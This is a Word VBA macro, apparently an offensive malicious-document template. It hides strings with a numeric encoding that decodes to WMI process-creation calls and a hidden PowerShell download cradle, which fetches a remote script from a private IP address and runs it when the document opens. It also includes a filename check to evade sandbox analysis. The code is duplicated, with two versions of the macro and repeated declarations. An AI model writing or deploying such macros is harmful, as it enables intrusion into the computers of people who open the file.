Function Pears(Beets)
  Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
  Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
  Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
  Do
  Oatmilk = Oatmilk + Pears(Strawberries(Milk))
  Milk = Almonds(Milk)
  Loop While Len(Milk) > 0
  Nuts = Oatmilk
End Function

Function Macro()
  ' avoid heuristics based on  file name
  If ActiveDocument.Name <> Nuts("<insert document name>") Then
    Exit Function
  End If

  Dim Apples As String
  Dim Water As String
  Apples = "<insert obfuscated payload>"
  Water = Nuts(Apples)
  GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function

Sub AutoOpen()
  Macro
End Sub


' -----------------------------




Function MyMacro()

 ' If ActiveDocument.Name <> Nuts("131118132134126118063117128116") Then
 '   Exit Function
 ' End If

  Dim Apples As String
  Dim Water As String
  Apples = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063069070063066073074064131134127063133137133056058058"
  Water = Nuts(Apples)
  GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function

Sub Document_Open()
  MyMacro
End Sub

Sub AutoOpen()
  MyMacro
End Sub

Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function


Function Strawberries(Grapes)
  Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
  Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
  Do
  Oatmilk = Oatmilk + Pears(Strawberries(Milk))
  Milk = Almonds(Milk)
  Loop While Len(Milk) > 0
  Nuts = Oatmilk
End Function
